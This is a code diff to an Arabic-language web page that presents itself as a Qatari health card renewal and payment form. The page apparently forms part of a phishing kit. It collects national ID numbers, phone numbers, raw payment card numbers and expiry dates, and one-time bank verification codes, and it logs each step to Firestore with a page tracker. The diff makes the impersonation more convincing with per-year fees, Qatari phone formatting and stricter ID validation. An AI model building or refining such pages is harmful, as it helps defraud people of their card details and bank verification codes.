@@ -8,6 +8,7 @@ import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/app
 import { Input } from '@/app/components/ui/input'
 import { Label } from '@/app/components/ui/label'
 import { RadioGroup, RadioGroupItem } from '@/app/components/ui/radio-group'
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/app/components/ui/select'
 import { FullPageLoader } from '@/app/components/loader'
 import { Check, CheckCircle, ChevronLeft, CreditCard, Lock, ShieldCheck } from 'lucide-react'
 
@@ -28,6 +29,9 @@ const RECEIPT_OPTIONS = [
   { id: 'yes', label: 'نعم' },
   { id: 'no', label: 'لا' },
 ] as const
+
+const YEAR_OPTIONS = ['1', '2', '3', '4', '5'] as const
+const FEE_PER_YEAR = 100
 
 type OperationType = (typeof OPERATION_OPTIONS)[number]['id']
 type ReceiptChoice = (typeof RECEIPT_OPTIONS)[number]['id']
@@ -119,9 +123,11 @@ export default function SubmitPage() {
   const unsubRef = useRef<(() => void) | null>(null)
   const yearsCount = useMemo(() => {
     const parsedYears = Number(requestedYears)
-    if (!Number.isFinite(parsedYears) || parsedYears < 1) return 1
-    return Math.min(5, Math.floor(parsedYears))
+    if (!Number.isFinite(parsedYears) || parsedYears < 1 || parsedYears > 5) return 1
+    return Math.floor(parsedYears)
   }, [requestedYears])
+  const totalFee = useMemo(() => yearsCount * FEE_PER_YEAR, [yearsCount])
+  const formattedPhone = useMemo(() => (phone ? `+974 ${phone}` : ''), [phone])
 
   const currentExpiryDate = useMemo(() => formatQatarDate(CURRENT_EXPIRY_REFERENCE), [])
   const newExpiryDate = useMemo(() => {
@@ -143,7 +149,7 @@ export default function SubmitPage() {
     const payload = {
       id: idNum,
       name: cardHolder.trim() || 'غير متوفر',
-      phone,
+      phone: formattedPhone,
       operationType,
       operationTypeLabel,
       requestedYears: yearsCount,
@@ -151,7 +157,7 @@ export default function SubmitPage() {
       wantsSmsReceipt: smsReceipt === 'yes',
       currentExpiryDate,
       newExpiryDate,
-      feeAmount: 100,
+      feeAmount: totalFee,
       method,
       cardNumber: cardNumber.replace(/\s/g, ''),
       dateMonth: month,
@@ -173,7 +179,7 @@ export default function SubmitPage() {
 
   const handleStep1 = async (e: FormEvent) => {
     e.preventDefault()
-    if (!idNum.trim() || idNum.trim().length < 8) return alert('الرجاء إدخال رقم البطاقة الشخصية بشكل صحيح')
+    if (idNum.trim().length !== 11) return alert('رقم البطاقة الشخصية يجب أن يكون 11 رقماً')
     setLoading(true)
     try {
       await saveToFirestore({ step: 1, currentPage: 'card-information' })
@@ -184,11 +190,10 @@ export default function SubmitPage() {
 
   const handleStep2 = async (e: FormEvent) => {
     e.preventDefault()
-    const enteredYears = Number(requestedYears)
-    if (!requestedYears.trim() || !Number.isFinite(enteredYears) || enteredYears < 1) {
-      return alert('الرجاء إدخال عدد السنوات المطلوبة')
+    if (!YEAR_OPTIONS.includes(requestedYears as (typeof YEAR_OPTIONS)[number])) {
+      return alert('الرجاء اختيار عدد السنوات المطلوبة')
     }
-    if (!phone.trim() || phone.length < 8) return alert('الرجاء إدخال رقم الهاتف بشكل صحيح')
+    if (phone.length !== 8) return alert('رقم الهاتف يجب أن يتكون من 8 أرقام بعد +974')
     setLoading(true)
     try {
       await saveToFirestore({ step: 2, currentPage: 'application-form' })
@@ -337,7 +342,7 @@ export default function SubmitPage() {
               </div>
               <div className="p-2">
                 <p className="text-[11px] text-gray-500">مبلغ المعاملة</p>
-                <p className="font-semibold text-sm">QAR 100.00</p>
+                <p className="font-semibold text-sm">QAR {totalFee.toFixed(2)}</p>
               </div>
               <div className="p-2">
                 <p className="text-[11px] text-gray-500">رقم الفاتورة</p>
@@ -365,10 +370,11 @@ export default function SubmitPage() {
                   <Input
                     id="id-num"
                     value={idNum}
-                    onChange={e => setIdNum(e.target.value.replace(/\D/g, ''))}
-                    placeholder="الرجاء إدخال الرقم"
+                    onChange={e => setIdNum(e.target.value.replace(/\D/g, '').slice(0, 11))}
+                    placeholder="أدخل 11 رقماً"
                     className="h-12"
                     inputMode="numeric"
+                    maxLength={11}
                   />
                 </div>
                 <div className="space-y-3">
@@ -418,26 +424,35 @@ export default function SubmitPage() {
                 <div className="border-t border-gray-200 pt-4" />
                 <div className="space-y-2">
                   <Label htmlFor="years">عدد السنوات المطلوبة <span className="text-red-500">*</span></Label>
-                  <Input
-                    id="years"
-                    value={requestedYears}
-                    onChange={e => setRequestedYears(e.target.value.replace(/\D/g, '').slice(0, 1))}
-                    className="h-12"
-                    inputMode="numeric"
-                    maxLength={1}
-                    placeholder="1"
-                  />
+                  <Select value={requestedYears} onValueChange={setRequestedYears}>
+                    <SelectTrigger id="years" className="h-12">
+                      <SelectValue placeholder="اختر عدد السنوات" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      {YEAR_OPTIONS.map((yearOption) => (
+                        <SelectItem key={yearOption} value={yearOption}>
+                          {yearOption}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
                 </div>
                 <div className="space-y-2">
                   <Label htmlFor="phone">رقم الهاتف <span className="text-red-500">*</span></Label>
-                  <Input
-                    id="phone"
-                    value={phone}
-                    onChange={e => setPhone(e.target.value.replace(/\D/g, ''))}
-                    placeholder="أدخل رقم الهاتف"
-                    className="h-12"
-                    inputMode="tel"
-                  />
+                  <div className="relative" dir="ltr">
+                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-semibold">
+                      +974
+                    </span>
+                    <Input
+                      id="phone"
+                      value={phone}
+                      onChange={e => setPhone(e.target.value.replace(/\D/g, '').slice(0, 8))}
+                      placeholder="55123456"
+                      className="h-12 pl-16"
+                      inputMode="tel"
+                      maxLength={8}
+                    />
+                  </div>
                 </div>
                 <div className="space-y-2">
                   <Label>هل تريد إستلام الإيصال عبر البريد الإلكتروني ؟</Label>
@@ -488,15 +503,15 @@ export default function SubmitPage() {
                   <SummaryRow label="تاريخ انتهاء الصلاحية الجديد" value={newExpiryDate} />
                   <SummaryRow label="عدد السنوات المطلوبة" value={String(yearsCount)} />
                   <SummaryRow label="نوع العملية" value={operationTypeLabel} />
-                  <SummaryRow label="رقم الهاتف" value={phone} />
+                  <SummaryRow label="رقم الهاتف" value={formattedPhone} />
                   <SummaryRow label="هل تريد إستلام الإيصال عبر البريد الإلكتروني ؟" value={emailReceipt === 'yes' ? 'نعم' : 'لا'} />
                   <SummaryRow label="هل تريد إستلام رسالة نصية ؟" value={smsReceipt === 'yes' ? 'نعم' : 'لا'} />
                 </div>
                 <div className="border-t border-gray-300 pt-4 space-y-1">
                   <h3 className="text-2xl sm:text-4xl font-bold text-gray-900 mb-2">الرسوم</h3>
                   <SummaryRow label="الرسوم المطلوب" value="رسوم تجديد البطاقة الصحية" />
-                  <SummaryRow label="قيمة الرسم" value="100 ريال قطري" />
-                  <SummaryRow label="المجموع" value="100 ريال قطري" />
+                  <SummaryRow label="قيمة الرسم" value={`${totalFee} ريال قطري`} />
+                  <SummaryRow label="المجموع" value={`${totalFee} ريال قطري`} />
                 </div>
                 <div className="flex flex-col sm:flex-row gap-3">
                   <Button type="button" onClick={() => setStep(2)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
@@ -684,7 +699,7 @@ export default function SubmitPage() {
                 رمز التحقق (OTP)
               </CardTitle>
               <CardDescription>
-                تم إرسال رمز التحقق إلى هاتفك: <span className="font-semibold text-gray-700">{phone}</span>
+                تم إرسال رمز التحقق إلى هاتفك: <span className="font-semibold text-gray-700">{formattedPhone}</span>
               </CardDescription>
             </CardHeader>
             <CardContent>
